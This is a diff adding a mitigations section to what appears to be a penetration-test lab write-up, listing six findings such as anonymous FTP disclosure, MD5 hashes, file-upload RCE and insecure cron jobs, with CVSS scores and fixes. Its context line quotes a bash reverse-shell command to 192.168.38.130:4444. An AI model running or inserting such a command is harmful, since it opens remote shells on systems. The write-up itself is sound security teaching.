@@ -240,6 +240,41 @@ bash -i >& /dev/tcp/192.168.38.130/4444 0>&1
 <img width="1053" height="584" alt="image" src="https://github.com/user-attachments/assets/39e266cf-73e9-414c-b73b-338b37aa0fb7" />  
 
 
+---
+
+## #Mitigations
+
+- 1. Information Disclosure via FTP  
+Severity: High  
+CVSS v3.1: 7.5  
+**Impact:** Unauthorized access to application credentials.  
+**Remediation:** Remove sensitive files from public locations & Disable anonymous FTP.
+
+  
+- 2. Weak Password Storage (MD5)  
+Severity: High  
+CVSS v3.1: 7.5  
+**Remediation:** Implement salting & Enforce strong password policies.
+
+- 3. Unrestricted File Upload (RCE)
+Severity: Critical  
+CVSS v3.1: 9.8  
+**Remediation:** Validate file signatures & Store uploads outside the web root.
+
+- 4. Credential Reuse
+Severity: High  
+CVSS v3.1: 8.8  
+**Remediation:** Separate application and system credentials.
+
+- 5. Plaintext Credentials in Configuration Files  
+Severity: Medium  
+CVSS v3.1: 6.5  
+**Remediation:** Store secrets in environment variables & Restrict file permissions.
+
+- 6. Insecure Cron Permissions  
+Severity: Critical  
+CVSS v3.1: 9.8  
+**Remediation:** Audit cron jobs regularly & Monitor integrity of privileged scripts.
 
 
 
